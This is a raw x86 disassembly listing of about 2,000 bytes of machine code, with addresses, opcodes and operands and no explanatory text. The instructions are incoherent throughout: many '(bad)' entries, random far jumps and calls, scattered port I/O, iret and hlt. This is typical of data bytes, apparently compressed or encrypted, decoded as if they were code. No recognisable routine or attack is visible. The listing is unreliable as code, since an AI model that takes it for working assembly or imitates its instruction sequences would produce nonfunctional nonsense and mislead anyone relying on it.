  418080:	dec    ebp
  418081:	outs   dx,DWORD PTR ds:[esi]
  418082:	bswap  edx
  418084:	call   0x7d65:0xc9a83354
  41808b:	scas   eax,DWORD PTR es:[edi]
  41808c:	mov    dh,ah
  41808e:	enter  0x71ad,0xeb
  418092:	pop    esi
  418093:	inc    ecx
  418094:	jle    0x418022
  418096:	mov    ebx,0xefbc9744
  41809b:	lods   al,BYTE PTR ds:[esi]
  41809c:	fst    QWORD PTR ds:0x817ecf18
  4180a2:	pop    ds
  4180a3:	(bad)  
  4180a4:	mov    edx,0xace54854
  4180a9:	call   0xea30dca9
  4180ae:	pusha  
  4180af:	jb     0x418089
  4180b1:	es movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  4180b4:	cmp    eax,0x5334acba
  4180b9:	fsubr  st,st(5)
  4180bb:	jg     0x418087
  4180bd:	stc    
  4180be:	add    DWORD PTR [edx-0x22],ebx
  4180c1:	inc    edi
  4180c2:	out    dx,al
  4180c3:	or     eax,0x837f3aff
  4180c8:	cs jg  0x418094
  4180cb:	loopne 0x4180a7
  4180cd:	inc    eax
  4180ce:	jecxz  0x4180d8
  4180d0:	stc    
  4180d1:	mov    al,ds:0x76ce8043
  4180d6:	cmp    eax,0x7e52aff8
  4180db:	xor    DWORD PTR [esi+0x4e5673da],edx
  4180e1:	xor    BYTE PTR ds:0xae36ea7b,0x50
  4180e8:	lods   al,BYTE PTR ds:[esi]
  4180e9:	out    0x3,al
  4180eb:	jle    0x418123
  4180ed:	aaa    
  4180ee:	test   BYTE PTR [ebx+0xbbac803],bh
  4180f4:	push   esi
  4180f5:	ret    
  4180f6:	mov    DWORD PTR [edi],ebp
  4180f8:	out    dx,al
  4180f9:	xlat   BYTE PTR ds:[ebx]
  4180fa:	mov    esi,DWORD PTR [ebp-0x503a1a89]
  418100:	sar    BYTE PTR [edx+0x5cb73275],1
  418106:	push   edx
  418107:	call   0x13a6c25f
  41810c:	sbb    eax,0x6871e74f
  418111:	int    0x55
  418113:	and    eax,0x7254405f
  418118:	out    dx,al
  418119:	repnz sbb ch,BYTE PTR es:[edx-0x1c]
  41811e:	(bad)  
  41811f:	lods   eax,DWORD PTR ds:[esi]
  418120:	into   
  418121:	hlt    
  418122:	(bad)
  418126:	push   ecx
  418127:	stos   BYTE PTR es:[edi],al
  418128:	test   al,0xf5
  41812a:	xchg   ebp,eax
  41812b:	or     DWORD PTR ds:0x31e3656e,ecx
  418131:	imul   esp,DWORD PTR [eax],0xa720d5e7
  418137:	shr    BYTE PTR [eax-0x5d],1
  41813a:	adc    eax,0xece72a8d
  41813f:	cmc    
  418140:	and    bl,dh
  418142:	xchg   ecx,eax
  418143:	mov    ds:0x9028d6be,eax
  418148:	inc    edx
  418149:	jmp    0xe495fc7c
  41814e:	lahf   
  41814f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418150:	repz adc BYTE PTR cs:[ebx+0x4caef166],ch
  418158:	out    dx,eax
  418159:	pop    edx
  41815a:	clc    
  41815b:	mov    esi,DWORD PTR [ebp-0x5f]
  41815e:	fldenv [ebx+0x3]
  418161:	ss adc al,0x2a
  418164:	fcom   QWORD PTR [esi]
  418166:	stos   DWORD PTR es:[edi],eax
  418167:	inc    edi
  418168:	mov    ebx,0x96398340
  41816d:	repz leave 
  41816f:	pop    edx
  418170:	jge    0x4181b4
  418172:	scas   eax,DWORD PTR es:[edi]
  418173:	int    0x96
  418175:	mov    al,ds:0xafed4556
  41817a:	out    dx,al
  41817b:	push   edx
  41817c:	jae    0x41819f
  41817e:	jmp    0x420f1cfc
  418183:	jbe    0x41816e
  418185:	popa   
  418186:	and    ecx,DWORD PTR [ebx+edx*8+0x44df62f7]
  41818d:	inc    ebp
  41818e:	jmp    0x9af09de8
  418193:	out    dx,eax
  418194:	int    0x9c
  418196:	jge    0x4181fb
  418198:	shl    dh,1
  41819a:	xor    ah,BYTE PTR [ecx-0x24d5fe24]
  4181a0:	cwde   
  4181a1:	shr    DWORD PTR [ecx+ebp*2-0x5e],cl
  4181a5:	lds    ebp,FWORD PTR [ecx]
  4181a7:	(bad)  
  4181a8:	mov    edi,0xc8c01bd1
  4181ad:	mov    ebp,0xd7b5d6f1
  4181b2:	ds sbb edi,esi
  4181b5:	xchg   edi,eax
  4181b6:	cmp    ebp,DWORD PTR [eax+eiz*4+0x165306aa]
  4181bd:	imul   eax,ebx,0x25c669a7
  4181c3:	xchg   esp,eax
  4181c4:	bound  edi,QWORD PTR ds:0xed4773d8
  4181ca:	cs push cs
  4181cc:	pop    ebp
  4181cd:	sbb    edi,DWORD PTR [ebx+ebx*8-0x5f0405c6]
  4181d4:	das    
  4181d5:	xor    DWORD PTR [esi+0x9],0x58
  4181d9:	inc    esi
  4181da:	fnstenv [ebx+0x7b106ed9]
  4181e0:	mov    edx,0xe681b25a
  4181e5:	retf   0x695b
  4181e8:	sub    al,0xe1
  4181ea:	sub    ecx,edi
  4181ec:	aam    0x20
  4181ee:	fnstenv [ecx+edx*2+0x14394dab]
  4181f5:	test   BYTE PTR [ebp+0x41],bh
  4181f8:	cmp    dh,bh
  4181fa:	xchg   ebx,eax
  4181fb:	ds add bh,cl
  4181fe:	dec    di
  418200:	lods   al,BYTE PTR ds:[esi]
  418202:	push   ebp
  418203:	sbb    al,BYTE PTR [edi]
  418205:	fwait
  418206:	xchg   esp,eax
  418207:	aam    0xb1
  418209:	adc    bh,BYTE PTR ds:0x4b32d769
  41820f:	addr16 (bad) 
  418211:	int    0x7b
  418213:	inc    DWORD PTR [esi]
  418215:	ins    DWORD PTR es:[edi],dx
  418216:	sbb    al,0xd8
  418218:	xchg   ebp,eax
  418219:	sbb    eax,0x3a1aef4
  41821e:	push   es
  41821f:	loop   0x418272
  418221:	cli    
  418222:	pop    ss
  418223:	sub    DWORD PTR [esi],eax
  418225:	mov    ebx,0xad5a7d47
  41822a:	cmc    
  41822b:	test   BYTE PTR [eax],cl
  41822d:	imul   ebx,edi,0xffffffd0
  418230:	cmp    al,0x28
  418232:	mov    edx,0xbf50ad23
  418237:	adc    al,BYTE PTR [esi-0x63de495c]
  41823d:	jg     0x4181fe
  41823f:	push   es
  418240:	in     eax,0xf4
  418242:	pop    ds
  418243:	sbb    edi,esi
  418245:	mov    bh,0x12
  418247:	jl     0x41821a
  418249:	jecxz  0x41822b
  41824b:	call   0xd07a:0xbfaad959
  418252:	pop    esi
  418253:	loopne 0x418269
  418255:	retf   
  418256:	setle  BYTE PTR [eax+0x6711fb15]
  41825d:	jno    0x41829f
  41825f:	mov    cl,0x7d
  418261:	je     0x4181ee
  418263:	stc    
  418264:	pusha  
  418265:	outs   dx,BYTE PTR ds:[esi]
  418266:	pop    ds
  418267:	pop    esi
  418268:	xchg   esi,eax
  418269:	jmp    0x2113a578
  41826e:	inc    edx
  41826f:	(bad)  
  418270:	sbb    ebx,DWORD PTR [edi+edx*2+0xc]
  418274:	push   eax
  418275:	and    BYTE PTR [edx-0x208532e],bl
  41827b:	bound  ebp,QWORD PTR [ebp+0x3c]
  41827e:	inc    edi
  41827f:	mov    dl,0x1d
  418281:	sub    al,0x28
  418283:	inc    ebx
  418284:	pop    es
  418285:	dec    ebp
  418286:	pop    edi
  418287:	cmp    eax,DWORD PTR [esi]
  418289:	out    dx,eax
  41828a:	in     al,0xad
  41828c:	xchg   DWORD PTR [ebx-0x19567124],ebx
  418292:	loop   0x418221
  418294:	inc    edi
  418295:	xchg   ebx,eax
  418296:	rol    DWORD PTR [edx-0x4c],0x24
  41829a:	push   esp
  41829b:	mov    ecx,0xf2550d77
  4182a0:	test   BYTE PTR ds:0xc9c894db,ah
  4182a6:	repnz dec ecx
  4182a8:	cmp    ebp,DWORD PTR [ebp-0x7a]
  4182ab:	shl    ecx,0xdd
  4182ae:	sti    
  4182af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182b0:	leave  
  4182b1:	mov    edx,0x7b6dcef6
  4182b6:	push   ebp
  4182b7:	dec    esi
  4182b8:	fnstcw WORD PTR [eax+ebp*1]
  4182bb:	scas   al,BYTE PTR es:[edi]
  4182bc:	shl    DWORD PTR [ebp-0x58f57ae0],1
  4182c2:	ror    DWORD PTR [eax-0x6589c7c0],0x0
  4182c9:	push   esp
  4182ca:	cdq    
  4182cb:	inc    esp
  4182cc:	jmp    0xaba6f3fb
  4182d1:	adc    ch,BYTE PTR [ecx-0x29f146af]
  4182d7:	fprem  
  4182d9:	inc    ebx
  4182da:	sti    
  4182db:	bnd jge 0x4182e6
  4182de:	xchg   ebp,eax
  4182df:	repnz fcom QWORD PTR [ecx-0x1f]
  4182e3:	std    
  4182e4:	(bad)  
  4182e5:	dec    edx
  4182e6:	fmul   QWORD PTR [edi-0x3de78bf8]
  4182ec:	jge    0x418294
  4182ee:	mov    esi,0x1973bf9e
  4182f3:	repnz stc 
  4182f5:	pop    ss
  4182f6:	inc    ebx
  4182f7:	sahf   
  4182f8:	daa    
  4182f9:	ss cmc 
  4182fb:	xchg   DWORD PTR [ebx-0x10b1bc1b],ecx
  418301:	and    dh,ah
  418303:	fstp   DWORD PTR [eax+0x2d2de695]
  418309:	pop    ds
  41830a:	test   al,0x15
  41830c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41830d:	ss sub ax,0x4ad9
  418312:	xchg   ecx,eax
  418313:	pop    ss
  418314:	not    DWORD PTR [esi+0x5a6be5b8]
  41831a:	call   DWORD PTR [ebx-0x35]
  41831d:	in     al,dx
  41831e:	pop    eax
  41831f:	daa    
  418320:	push   ss
  418321:	mov    ch,0xb4
  418323:	inc    esp
  418324:	(bad)  
  418325:	xor    DWORD PTR [ecx+0x57eb9549],eax
  41832b:	sbb    esi,DWORD PTR [edi]
  41832d:	out    dx,al
  41832e:	mov    ds:0x67325e15,al
  418333:	and    ah,BYTE PTR [eax+0x2d5423e6]
  418339:	mov    ebx,0xef0bdb31
  41833e:	pop    esp
  41833f:	loop   0x41831c
  418341:	or     eax,0x3fc2d69f
  418346:	scas   al,BYTE PTR es:[edi]
  418347:	xchg   edi,eax
  418348:	xor    DWORD PTR [eax],eax
  41834a:	loop   0x41837a
  41834c:	ss js  0x4182d0
  41834f:	call   0x4f6a:0xad185653
  418356:	pcmpeqd mm5,mm6
  418359:	cli    
  41835a:	lea    ebx,[ebx-0x2c390a93]
  418360:	xor    cl,cl
  418362:	sbb    DWORD PTR [ecx-0x489d5ae4],ecx
  418368:	cmp    BYTE PTR [edi-0x63727cd6],cl
  41836e:	and    ch,dl
  418370:	mov    DWORD PTR [esi+0x55],ecx
  418373:	popa   
  418374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418375:	and    eax,0xe3e3c7ae
  41837a:	idiv   DWORD PTR [ecx+0x65c453db]
  418380:	adc    ebx,DWORD PTR [edi-0x4d33d282]
  418386:	loope  0x4183d7
  418388:	inc    edi
  418389:	mov    BYTE PTR [esp+eax*1+0x303e5e32],cl
  418390:	sbb    eax,0x33e2a91b
  418395:	xor    ch,BYTE PTR [ebp-0x2d8aba0c]
  41839b:	test   BYTE PTR [ebx-0x7ab4d9f],al
  4183a1:	jb     0x4183f7
  4183a3:	clc    
  4183a4:	scas   al,BYTE PTR es:[edi]
  4183a5:	mov    eax,ecx
  4183a7:	lods   al,BYTE PTR ds:[esi]
  4183a8:	mov    ebx,0x361aa469
  4183ad:	aam    0xdf
  4183af:	sbb    edi,DWORD PTR ss:[ebx-0x23]
  4183b3:	(bad)  
  4183b4:	push   ds
  4183b5:	sbb    esp,esp
  4183b7:	xchg   esp,eax
  4183b8:	ret    0x5ce3
  4183bb:	adc    eax,0xb4778491
  4183c0:	mov    esp,0xb848bb44
  4183c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183c6:	cld    
  4183c7:	jg     0x4183b2
  4183c9:	lahf   
  4183ca:	mov    ds:0x99addc08,al
  4183cf:	dec    BYTE PTR [eax]
  4183d1:	add    dh,bl
  4183d3:	adc    eax,0x60529589
  4183d8:	call   DWORD PTR [esi-0x3b8a45d8]
  4183de:	in     eax,0x11
  4183e0:	cld    
  4183e1:	(bad)  
  4183e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183e3:	iret   
  4183e4:	loopne 0x4183c3
  4183e6:	pop    es
  4183e7:	fistp  QWORD PTR [edi]
  4183e9:	ds (bad) 
  4183eb:	mov    bh,0x5a
  4183ed:	fisttp WORD PTR [eax-0x3e563619]
  4183f3:	lock push ds
  4183f5:	jge    0x41844a
  4183f7:	push   0xffffffc3
  4183f9:	es pop ebx
  4183fb:	jns    0x418435
  4183fd:	pop    es
  4183fe:	pop    esi
  4183ff:	xor    eax,0x7decd309
  418404:	and    eax,0x10d733d0
  418409:	cmp    esi,DWORD PTR [edx-0x3d]
  41840c:	mov    al,ds:0xdf6ee773
  418411:	pop    eax
  418412:	iret   
  418413:	mov    eax,ds:0xe245d135
  418418:	sbb    ax,0x17ee
  41841c:	mov    ds:0xff83484e,eax
  418421:	jne    0x4183b6
  418423:	out    0xf1,al
  418425:	push   es
  418426:	fs jle 0x4183b3
  418429:	arpl   ax,si
  41842b:	sbb    BYTE PTR [edi+ebx*2-0x15084953],al
  418432:	pusha  
  418433:	stos   BYTE PTR es:[edi],al
  418434:	iret   
  418435:	add    cl,BYTE PTR [ebx-0x2a06db30]
  41843b:	mov    ds:0x3d7f69b7,eax
  418440:	ins    BYTE PTR es:[edi],dx
  418441:	or     eax,0xde97da45
  418446:	out    dx,al
  418447:	in     al,0x74
  418449:	daa    
  41844a:	xchg   ebp,eax
  41844b:	push   ds
  41844c:	mov    dl,0x88
  41844e:	xchg   esp,eax
  41844f:	mov    bh,0xed
  418451:	jecxz  0x4184a5
  418453:	xchg   DWORD PTR [ecx],ecx
  418455:	fs (bad) 
  418457:	jge    0x4184c4
  418459:	adc    eax,0xea4ae618
  41845e:	cmc    
  41845f:	pusha  
  418460:	in     al,0x3e
  418462:	arpl   dx,dx
  418464:	aam    0xb8
  418466:	add    esp,DWORD PTR [edi-0x1d]
  418469:	dec    esp
  41846a:	subps  xmm0,XMMWORD PTR [eax]
  41846d:	mov    edx,0xa0dc7446
  418472:	jae    0x418400
  418474:	jmp    0xce900cbf
  418479:	das    
  41847a:	jmp    0x2de0:0x7540a5f4
  418481:	inc    esi
  418482:	sbb    eax,0x4455e6b7
  418487:	fst    QWORD PTR [esi-0x341f91ff]
  41848d:	sti    
  41848e:	add    BYTE PTR [eax-0x457484d5],bh
  418494:	loop   0x418421
  418496:	xchg   dh,al
  418498:	ret    
  418499:	mov    eax,ds:0xf3286489
  41849e:	pop    ebx
  41849f:	mov    bl,0x44
  4184a1:	cli    
  4184a2:	xchg   ebx,eax
  4184a3:	fs ror bh,1
  4184a6:	cwde   
  4184a7:	test   al,0x92
  4184a9:	dec    eax
  4184aa:	pop    ss
  4184ab:	(bad)  
  4184ac:	fnstsw WORD PTR [eax+0x7]
  4184af:	and    bl,cl
  4184b1:	dec    ebp
  4184b2:	adc    DWORD PTR [ebp+0x10],esp
  4184b5:	jmp    0x4184f2
  4184b7:	pusha  
  4184b8:	xchg   esi,eax
  4184b9:	sbb    DWORD PTR [ebx-0x6e22a617],esp
  4184bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184c0:	pusha  
  4184c1:	je     0x418498
  4184c3:	push   esi
  4184c4:	scas   al,BYTE PTR es:[edi]
  4184c5:	jle    0x4184eb
  4184c7:	jbe    0x4184f9
  4184c9:	mov    eax,ds:0x987c375a
  4184ce:	push   esi
  4184cf:	inc    edi
  4184d0:	cmp    BYTE PTR [edx+0x4c],al
  4184d3:	shl    DWORD PTR [ecx-0x18],0x12
  4184d7:	loope  0x418489
  4184d9:	jmp    0xae51:0x5e03f964
  4184e0:	lods   al,BYTE PTR ds:[esi]
  4184e1:	adc    BYTE PTR [ebp-0x14],bh
  4184e4:	stc    
  4184e5:	fst    DWORD PTR ds:0xba870d2b
  4184eb:	mov    ch,0x4b
  4184ed:	push   ebp
  4184ee:	inc    esp
  4184ef:	fstp   QWORD PTR [edx+0x34]
  4184f2:	ret    
  4184f3:	jp     0x418562
  4184f5:	sub    BYTE PTR [edi-0x43],bh
  4184f8:	cmp    DWORD PTR [ebp-0x505ca7e5],0x7c
  4184ff:	in     al,0x77
  418501:	daa    
  418502:	out    0xb7,al
  418504:	sahf   
  418505:	sbb    DWORD PTR [ebx],esi
  418507:	add    DWORD PTR [ebx-0x115739cd],esp
  41850d:	out    0xab,al
  41850f:	xor    ebp,esp
  418511:	jg     0x41849c
  418513:	sahf   
  418514:	(bad)  
  418515:	arpl   WORD PTR [edi-0x5b],cx
  418518:	cmp    ch,BYTE PTR [edx-0x7857e98f]
  41851e:	scas   al,BYTE PTR es:[edi]
  41851f:	shl    esp,cl
  418521:	pop    ds
  418522:	daa    
  418523:	sub    al,0x41
  418525:	inc    esi
  418526:	and    al,0xd1
  418528:	sti    
  418529:	fist   WORD PTR [esi]
  41852b:	mov    DWORD PTR [eax],ebp
  41852d:	mov    bl,0xf
  41852f:	xor    cl,dl
  418531:	xor    BYTE PTR [ecx+0x4cc40ad4],0x23
  418538:	sub    al,0xd4
  41853a:	rol    BYTE PTR [eax],0x33
  41853d:	add    bl,BYTE PTR [ebx-0x20]
  418540:	or     DWORD PTR [esi],ebp
  418542:	mov    al,0x58
  418544:	out    dx,al
  418545:	iret   
  418546:	sub    DWORD PTR [ecx-0x20],esi
  418549:	mov    eax,0xf022979a
  41854e:	in     eax,dx
  41854f:	inc    ebx
  418550:	jno    0x41854a
  418552:	test   al,0x7e
  418554:	push   ebp
  418555:	adc    BYTE PTR [ecx],0x92
  418558:	mov    eax,ds:0xb7f752ea
  41855d:	sub    al,BYTE PTR [edi-0x78ff12d0]
  418563:	bnd jno 0x41853a
  418566:	in     eax,dx
  418567:	shr    DWORD PTR [edx-0x5f],cl
  41856a:	mov    dh,BYTE PTR [ebp-0x3c]
  41856d:	cmp    bh,BYTE PTR [esi]
  41856f:	cwde   
  418570:	fst    QWORD PTR [ebx+0x2a]
  418573:	and    dh,bl
  418575:	scas   al,BYTE PTR es:[edi]
  418576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418577:	adc    al,0xde
  418579:	sahf   
  41857a:	sub    al,0xb0
  41857c:	scas   al,BYTE PTR es:[edi]
  41857d:	ins    DWORD PTR es:[edi],dx
  41857e:	(bad)  
  41857f:	xor    eax,0xc67cee96
  418584:	aad    0x7d
  418586:	xchg   edx,ecx
  418588:	aam    0xd9
  41858a:	lods   eax,DWORD PTR ds:[esi]
  41858b:	push   ds
  41858c:	mov    dl,0xcd
  41858e:	pusha  
  41858f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418590:	mov    eax,ds:0x60383d4e
  418595:	div    DWORD PTR [edi+ecx*4]
  418598:	push   eax
  418599:	and    eax,0x5d45db79
  41859e:	(bad)  
  41859f:	in     al,0xcd
  4185a1:	cmp    BYTE PTR ds:0xc95f572a,0x60
  4185a8:	jo     0x41854b
  4185aa:	add    DWORD PTR [esi],ecx
  4185ac:	sbb    al,0xec
  4185ae:	sub    al,0xde
  4185b0:	cli    
  4185b1:	iret   
  4185b2:	mov    edi,0xe2e6c96a
  4185b7:	jmp    0x41858d
  4185b9:	mov    edx,0xd1980124
  4185be:	rol    DWORD PTR [ecx],cl
  4185c0:	pop    ebp
  4185c1:	sbb    eax,0x25b5e50b
  4185c6:	add    bl,ah
  4185c8:	stos   DWORD PTR es:[edi],eax
  4185c9:	aam    0x3d
  4185cb:	inc    eax
  4185cc:	in     al,0xc7
  4185ce:	stos   DWORD PTR es:[edi],eax
  4185cf:	fmul   st,st(7)
  4185d1:	sar    ecx,cl
  4185d3:	push   ebx
  4185d4:	push   edi
  4185d5:	inc    ecx
  4185d6:	jae    0x418588
  4185d8:	adc    al,0x2d
  4185da:	push   ss
  4185db:	mov    edx,0x3ae0ae50
  4185e0:	and    bh,BYTE PTR [esi-0x1c2617f1]
  4185e6:	dec    ecx
  4185e7:	sub    ecx,edx
  4185e9:	jg     0x418633
  4185eb:	cmp    eax,0x641f4b71
  4185f0:	fwait
  4185f1:	repz jmp 0xc67e:0xbddf5cdd
  4185f9:	jmp    0x657dd32e
  4185fe:	aad    0xd8
  418600:	sub    cl,BYTE PTR [eax-0x7226e2ba]
  418606:	idiv   DWORD PTR [edi+ebx*4+0x7e]
  41860a:	hlt    
  41860b:	stos   DWORD PTR es:[edi],eax
  41860c:	out    dx,eax
  41860d:	mov    cl,0x48
  41860f:	jmp    0xfc24:0x7c93d11
  418616:	outs   dx,DWORD PTR ds:[esi]
  418617:	mov    eax,ds:0x6f5cf645
  41861c:	and    ch,BYTE PTR [edx-0x66]
  41861f:	sahf   
  418620:	pushf  
  418621:	scas   al,BYTE PTR es:[edi]
  418622:	cli    
  418623:	(bad)  
  418624:	mov    fs,WORD PTR [ecx+0x4d10bccf]
  41862a:	adc    DWORD PTR [esi-0x4ff3b75b],0x10
  418631:	and    al,0xc9
  418633:	popa   
  418634:	and    DWORD PTR [eax-0x1929aa91],ebx
  41863a:	mov    ah,0x5c
  41863c:	cmp    bl,cl
  41863e:	dec    ebp
  41863f:	rcr    eax,0xb9
  418642:	dec    esi
  418643:	mov    edx,0x14047666
  418648:	arpl   sp,si
  41864a:	mov    eax,0xa692e74e
  41864f:	lock mov eax,ds:0x7540c5eb
  418655:	pop    esi
  418656:	adc    DWORD PTR [esi+edi*8-0x3d],ebx
  41865a:	fnstcw WORD PTR [edx]
  41865c:	in     al,dx
  41865d:	pusha  
  41865e:	rol    DWORD PTR [ecx+0x6e3bb449],cl
  418664:	pop    ecx
  418665:	into   
  418666:	push   ebx
  418667:	lods   al,BYTE PTR ds:[esi]
  418668:	(bad)  
  418669:	jle    0x41865b
  41866b:	jecxz  0x4186da
  41866d:	icebp  
  41866e:	mov    dh,0x58
  418670:	das    
  418671:	mov    eax,DWORD PTR [edx+0x10]
  418674:	outs   dx,BYTE PTR ds:[esi]
  418675:	ror    BYTE PTR [ecx+0x465dab5d],0xf0
  41867c:	mov    al,BYTE PTR [edx-0x1736832c]
  418682:	rcl    BYTE PTR [ecx+0x19],1
  418685:	pop    edx
  418686:	xchg   BYTE PTR [ecx+0x4d],bh
  418689:	pop    ds
  41868a:	jmp    0xb40:0xe93a69a2
  418691:	in     al,dx
  418692:	pop    ebp
  418693:	jg     0x418640
  418695:	jmp    0x97ec4203
  41869a:	and    eax,0x6270ef76
  41869f:	jb     0x41871c
  4186a1:	fmul   QWORD PTR [ebx]
  4186a3:	cwde   
  4186a4:	pop    es
  4186a5:	push   ds
  4186a6:	xchg   esp,eax
  4186a7:	dec    esp
  4186a8:	jns    0x418698
  4186aa:	sbb    BYTE PTR [esi-0x6f],0x23
  4186ae:	arpl   WORD PTR [edi-0x5c2567fe],sp
  4186b4:	mov    esp,0x2ac0fee0
  4186b9:	loopne 0x41869b
  4186bb:	inc    esi
  4186bc:	mov    ecx,0x67732956
  4186c1:	(bad)  
  4186c3:	xchg   ecx,eax
  4186c4:	or     esi,DWORD PTR [eax+eax*8]
  4186c7:	xor    BYTE PTR [ebx],dl
  4186c9:	adc    esp,DWORD PTR [ecx]
  4186cb:	aam    0x56
  4186cd:	jle    0x4186a8
  4186cf:	push   esp
  4186d0:	sti    
  4186d1:	test   ch,al
  4186d3:	hlt    
  4186d4:	mov    DWORD PTR [eax],0x68f22a13
  4186da:	push   edx
  4186dc:	das    
  4186dd:	ss push eax
  4186df:	mov    ecx,0x54734269
  4186e4:	add    esi,DWORD PTR [edi]
  4186e6:	std    
  4186e7:	cli    
  4186e8:	jmp    0x41868b
  4186ea:	inc    edx
  4186eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186ec:	adc    DWORD PTR cs:[edx+0x2711b089],ebp
  4186f3:	sub    BYTE PTR [ecx],bl
  4186f5:	dec    edx
  4186f6:	jecxz  0x418707
  4186f8:	add    al,BYTE PTR [esi-0x5dd66e47]
  4186fe:	push   ebp
  4186ff:	sub    eax,0x85ce31ed
  418704:	xor    dh,BYTE PTR [si]
  418707:	(bad)  
  418708:	frstor [edx+0x6355053c]
  41870e:	cmp    dh,BYTE PTR [ecx]
  418710:	scas   al,BYTE PTR es:[edi]
  418711:	(bad)  
  418712:	fcmovu st,st(6)
  418714:	sub    al,BYTE PTR [esi+0x167cbd8f]
  41871a:	in     al,dx
  41871b:	mov    ds:0x9a9df934,al
  418720:	ins    BYTE PTR es:[edi],dx
  418721:	mov    ds:0xe550493f,al
  418726:	scas   eax,DWORD PTR es:[edi]
  418727:	push   0x39fb2bd1
  41872c:	jp     0x4186d5
  41872e:	fadd   st(3),st
  418730:	cmp    DWORD PTR [esp+edx*8-0x79],ebp
  418734:	les    ebp,FWORD PTR [ecx]
  418736:	pop    esp
  418737:	add    dh,dh
  418739:	cmc    
  41873a:	add    al,0xe1
  41873c:	lods   al,BYTE PTR ds:[esi]
  41873d:	(bad)  
  41873e:	jbe    0x418709
  418740:	jne    0x4187b2
  418742:	push   ebx
  418743:	push   cs
  418744:	add    DWORD PTR [ebx],ebp
  418746:	pushf  
  418747:	dec    ebx
  418748:	mov    esp,DWORD PTR [esi+eax*2+0x58]
  41874c:	mov    al,BYTE PTR [ebp+0x4a0c3b73]
  418752:	sub    BYTE PTR [ebx+0x56],al
  418755:	and    al,0xcd
  418757:	and    al,0xdd
  418759:	mov    dh,0xe1
  41875b:	cmp    BYTE PTR [di],bl
  41875e:	pop    ebp
  41875f:	cmp    BYTE PTR [edx+edi*1+0x29],al
  418763:	lock mov edi,0x2907c50
  418769:	ins    BYTE PTR es:[edi],dx
  41876a:	pop    ecx
  41876b:	rcl    BYTE PTR ds:0xb573bdd3,1
  418771:	jg     0x4187bb
  418773:	xchg   ecx,eax
  418774:	cmp    al,0x79
  418776:	mov    al,ds:0x16e5bb85
  41877b:	into   
  41877c:	mov    dl,BYTE PTR es:[ebx]
  41877f:	sar    DWORD PTR [ecx],1
  418781:	test   eax,0x7e8c352f
  418786:	inc    ebx
  418787:	rol    DWORD PTR ds:0x430289fb,0xb8
  41878e:	sbb    DWORD PTR [ecx+0x42],0xffffffb3
  418792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418793:	mov    al,0x4
  418795:	jg     0x418772
  418797:	es push 0xffffffaa
  41879a:	dec    ebp
  41879b:	cmc    
  41879c:	in     eax,dx
  41879d:	or     eax,0x9c831028
  4187a2:	dec    eax
  4187a3:	out    dx,al
  4187a4:	adc    eax,0x92a7899b
  4187a9:	fistp  WORD PTR [esi]
  4187ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187ac:	xlat   BYTE PTR ds:[ebx]
  4187ad:	push   ds
  4187ae:	mov    edx,0x4c2b5cb2
  4187b3:	js     0x4187b2
  4187b5:	and    BYTE PTR [esp+eax*2],bh
  4187b8:	or     dh,ah
  4187ba:	je     0x41875a
  4187bc:	inc    esp
  4187bd:	ss aam 0x98
  4187c0:	nop
  4187c1:	nop
  4187c2:	jg     0x41881f
  4187c4:	pop    edi
  4187c5:	mov    edi,0xf65247f6
  4187ca:	cmp    al,0x95
  4187cc:	fsubr  DWORD PTR [esi+0x711c851b]
  4187d2:	mov    ds,WORD PTR [ebx-0x5b3983b7]
  4187d8:	push   ds
  4187d9:	push   edx
  4187da:	push   eax
  4187db:	(bad)  
  4187dc:	(bad)  
  4187dd:	mov    al,0x8f
  4187df:	ret    0xa765
  4187e2:	jp     0x4187b4
  4187e4:	push   0xffffff89
  4187e6:	(bad)  [esi]
  4187e8:	jle    0x418790
  4187ea:	icebp  
  4187eb:	xchg   DWORD PTR [ecx-0x40b3a58],ebx
  4187f1:	sbb    DWORD PTR [edx+0x2b],esp
  4187f4:	rol    DWORD PTR [edx+ebx*8-0x30],cl
  4187f8:	int3   
  4187f9:	xchg   ecx,eax
  4187fa:	pusha  
  4187fb:	cs retf 0xd787
  4187ff:	jmp    0xe29d:0x4f3894ba
  418806:	dec    eax
  418807:	idiv   DWORD PTR [edx-0x2e]
  41880a:	mov    WORD PTR [ecx],gs
  41880c:	loopne 0x418817
  41880e:	mov    ecx,0xf771eb94
  418813:	ret    0x28ac
  418816:	sub    DWORD PTR [edx+0x20],esi
  418819:	ds adc eax,0xec9a5a67
  41881f:	fwait
  418820:	xor    ebx,ebp
  418822:	push   esi
  418823:	xchg   ebp,eax
  418824:	out    dx,eax
  418825:	jmp    0xc323c82a
  41882a:	in     eax,0x1c
  41882c:	jbe    0x41889e
  41882e:	loope  0x418822
  418830:	pusha  
  418831:	icebp  
  418832:	in     eax,0xa0
  418834:	and    DWORD PTR [esp+esi*2-0x5a],0xa6cc4b07
  41883c:	push   eax
  41883d:	scas   al,BYTE PTR es:[edi]
  41883e:	or     ecx,DWORD PTR [ebx]
  418840:	pop    ss
  418841:	push   esp
  418842:	not    BYTE PTR ds:0x5d7b3c10
  418848:	out    0x88,eax
  41884a:	xor    bh,BYTE PTR [ecx+ecx*1]
  41884d:	mov    BYTE PTR [ebp-0x5e857ada],dl
  418853:	dec    eax
  418854:	mov    bl,BYTE PTR [ebx+0x66b9c349]
  41885a:	or     edi,edx
  41885c:	gs push esi
  41885e:	or     BYTE PTR [eax+esi*2],al
  418861:	popf   
  418862:	pop    edi
  418863:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418864:	xchg   esp,eax
  418865:	js     0x4187ec
  418867:	mov    eax,0x267f4562
  41886c:	pusha  
  41886d:	jbe    0x41888c
  41886f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418870:	xchg   BYTE PTR [edx+0x6be5457b],ah
  418876:	jecxz  0x4188c9
  418878:	div    BYTE PTR [ebp-0x27]
